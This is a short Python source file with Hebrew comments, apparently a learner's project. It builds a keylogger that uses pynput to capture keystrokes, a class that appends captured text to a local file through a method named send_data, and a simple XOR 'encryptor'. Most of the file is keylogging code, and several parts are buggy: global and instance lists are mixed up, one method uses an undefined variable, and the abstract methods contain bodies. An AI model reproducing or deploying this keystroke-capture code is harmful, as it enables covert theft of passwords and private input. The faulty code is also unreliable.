from pynput import keyboard
from abc import ABC, abstractmethod
import threading

text = []
#מחלקה שמפעילה את התוכנית או מכבה
class IKeyLogger(ABC):
    def __init__(self):
        self.text = []
        self.listener = None
    @abstractmethod
    def start_logging(self):
        
        def on_press(key):
            global text
            if key == keyboard.Key.enter:
                self.text.append(key)
            elif key == keyboard.Key.tab:
                self.text.append(key)
            elif key == keyboard.Key.space:
                self.text.append(' ') 
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace and len(text) == 0:
                pass
            elif key == keyboard.Key.backspace and len(text) > 0:
                self.text = self.text[:-1]
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            elif key == keyboard.Key.esc:
                return False
            else:
                self.text.append(key)
                print(text)
            
        with keyboard.Listener(
            on_press=on_press) as listener:
            listener.join()    
                          
    @abstractmethod
    def stop_logging(self):
        if self.listener:
            self.listener.stop()

    @abstractmethod
    def get_logged_keys(self):
        return self.text
        



#מחלקה שכותבת את המילים המתקבלות לתוך קובץ טקסט
class IWriter(ABC):
    @abstractmethod
    def send_data(self, data: str, machine_name: str):
        for i in data:
            text += i
        with open('text.txt','a') as file:
            file.write(text)
        

#xor מחלקה שמצפינה מילים באצעות
class Encryptor:
    def encryption_using_xor(self,data: list,key):
        encrypted_text = ''
        key_length = len(data)
        for i, word in enumerate(data):
            encrypted_text += chr(ord(word) ^ key)
        print (encrypted_text)    
        return encrypted_text
    #דוגמא לשימוש בהצפנה
# a = Encryptor()
# b = a.encryption_using_xor('yosef taktuk ashkelon',4) 
# a.encryption_using_xor(b,4)
